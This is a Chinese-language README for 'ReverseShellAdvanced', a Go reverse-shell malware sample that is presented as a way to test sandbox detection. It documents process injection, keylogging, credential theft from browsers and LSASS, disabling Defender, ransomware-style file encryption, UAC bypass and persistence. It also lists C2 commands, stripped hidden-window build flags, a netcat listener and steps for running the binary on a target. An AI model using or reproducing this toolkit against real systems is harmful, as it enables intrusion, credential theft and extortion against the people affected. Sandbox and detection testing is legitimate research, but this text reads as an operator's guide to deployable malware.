# ReverseShellAdvanced

> ⚠️ **仅供安全研究和教育目的使用，请在隔离环境中测试**

这是一个用于测试沙箱检测能力的高级反向Shell恶意软件样本，包含多种典型恶意行为特征，可被 Cuckoo 等沙箱正确识别。

## 功能特性

### 恶意行为特征

| 类别 | 技术 | 触发的检测签名 |
|------|------|----------------|
| **进程注入** | VirtualAllocEx + WriteProcessMemory + CreateRemoteThread | injection_* |
| **Shellcode执行** | VirtualAlloc (RWX) + CreateThread | shellcode_* |
| **键盘记录** | GetAsyncKeyState 循环监控 | keylogger_* |
| **凭证窃取** | Chrome/Edge/Firefox 凭证、WiFi密码、LSASS dump | stealer_* |
| **安全软件禁用** | 停止 Defender、删除卷影副本、清除日志 | antiav_*, ransomware_* |
| **文件加密** | AES 加密 + 勒索信生成 | ransomware_* |
| **UAC绕过** | fodhelper / eventvwr 注册表劫持 | uac_bypass_* |
| **下载执行** | PowerShell IEX、certutil、bitsadmin | downloader_* |
| **网络侦察** | arp、netstat、net view /domain | recon_* |
| **持久化** | 注册表Run键、计划任务、启动文件夹 | persistence_* |

### 静态特征

程序中包含以下可被静态分析检测的恶意字符串：

- Mimikatz 相关命令（sekurlsa::logonpasswords、lsadump::sam）
- 攻击框架名称（Cobalt Strike、Empire、meterpreter）
- 恶意 PowerShell 模式（IEX、DownloadString、Invoke-Expression）
- 比特币地址

### 动态API调用

加载的敏感 Windows API：

```txt
kernel32.dll: VirtualAlloc, VirtualAllocEx, CreateThread, CreateRemoteThread, 
              OpenProcess, WriteProcessMemory, ReadProcessMemory
ntdll.dll:    NtCreateThreadEx, RtlCreateUserThread
user32.dll:   GetAsyncKeyState, GetForegroundWindow, GetWindowTextW
advapi32.dll: RegOpenKeyExW, RegSetValueExW
psapi.dll:    EnumProcesses, EnumProcessModules
```

## C2 命令

连接成功后支持以下命令：

| 命令 | 说明 |
|------|------|
| `sysinfo` | 收集系统信息 |
| `recon` | 网络侦察（ARP、路由、共享、域信息） |
| `creds` | 窃取凭证（浏览器、WiFi） |
| `persist` | 建立持久化 |
| `disableav` | 禁用安全软件 |
| `uacbypass` | 尝试 UAC 绕过 |
| `encrypt` | 加密用户文档（⚠️ 危险） |
| `inject` | 执行 shellcode |
| `exit` | 断开连接 |
| `<任意命令>` | 通过 cmd /C 执行 |

## 编译

### 环境要求

- Go 1.21+
- macOS / Linux / Windows

### 交叉编译（macOS → Windows）

```bash
# 使用编译脚本
./build.sh

# 或手动编译
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui" -o bin/reverse_shell_win64.exe main.go
GOOS=windows GOARCH=386 go build -ldflags="-s -w -H windowsgui" -o bin/reverse_shell_win32.exe main.go
```

### 编译参数说明

| 参数 | 作用 |
|------|------|
| `GOOS=windows` | 目标系统 Windows |
| `GOARCH=amd64/386` | 64位/32位架构 |
| `-ldflags="-s -w"` | 去除符号表和调试信息 |
| `-H windowsgui` | 隐藏控制台窗口 |

## 使用方法

### 1. 修改 C2 地址

编辑 `main.go` 中的常量：

```go
const (
    C2Server = "YOUR_IP:4444"
)
```

### 2. 编译

```bash
./build.sh
```

### 3. 启动监听

```bash
# 攻击机
nc -lvnp 4444
# 或
rlwrap nc -lvnp 4444
```

### 4. 在靶机执行

将 `bin/reverse_shell_win64.exe` 传输到 Windows 靶机执行。

## 测试工具

`test/main.go` 是一个无害的功能测试程序，用于验证：

- 命令执行功能
- Windows API 调用
- 注册表访问
- 文件操作
- PowerShell 执行

```bash
# 编译测试程序
GOOS=windows GOARCH=amd64 go build -o bin/test_win64.exe test/main.go
```

## 项目结构

```
ReverseShellAdvanced/
├── main.go          # 主程序（完整恶意功能）
├── go.mod           # Go 模块定义
├── build.sh         # 编译脚本
├── README.md        # 说明文档
├── test/
│   └── main.go      # 功能测试程序（无害）
└── bin/
    ├── reverse_shell_win64.exe  # 64位版本
    ├── reverse_shell_win32.exe  # 32位版本
    └── test_win64.exe           # 测试程序
```

## 靶机恢复

如果在真实环境测试，执行后需要清理：

```powershell
# 删除持久化
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /f
schtasks /delete /tn WindowsUpdateTask /f
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"

# 删除临时文件
rd /s /q "%TEMP%\cache"
del "%TEMP%\keylog.txt"
del "%TEMP%\lsass.dmp"
del "%TEMP%\payload.exe"
del "%TEMP%\mimikatz.log"
del "%TEMP%\pwdump.txt"

# 重新启用 Defender
Set-MpPreference -DisableRealtimeMonitoring $false
sc config WinDefend start=auto
net start WinDefend
```

**建议**：在虚拟机中测试，测试前创建快照，测试后直接恢复快照。

## 检测结果

本样本可被以下安全产品检测：

- ✅ Cuckoo Sandbox
- ✅ Windows Defender（需开启实时保护）
- ✅ VirusTotal（多引擎检测）

## 免责声明

本项目仅供以下用途：

- 安全研究和学习
- 沙箱检测能力测试
- 终端防护产品评估
- 恶意软件分析培训

**严禁用于任何非法目的。使用者需自行承担法律责任。**

## 参考资料

- [Cuckoo Sandbox](https://cuckoosandbox.org/)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [Windows API Index](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list)
